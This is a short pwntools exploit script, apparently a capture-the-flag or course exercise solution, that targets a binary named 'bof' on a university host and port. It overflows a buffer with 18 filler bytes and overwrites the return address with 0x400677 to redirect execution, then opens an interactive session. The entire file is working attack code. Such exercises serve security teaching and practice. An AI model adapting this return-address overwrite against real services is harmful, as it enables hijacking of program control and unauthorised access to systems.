#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'bof' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "eens.ee.ncku.edu.tw"
    port = 2007
    r = remote(ip,port)

context.arch = 'amd64'

addr = 0x0000000000400677
payload = "a"*18 + p64(addr)

print('payload = '+payload)
r.recvuntil(':')
r.sendline(payload)
r.interactive()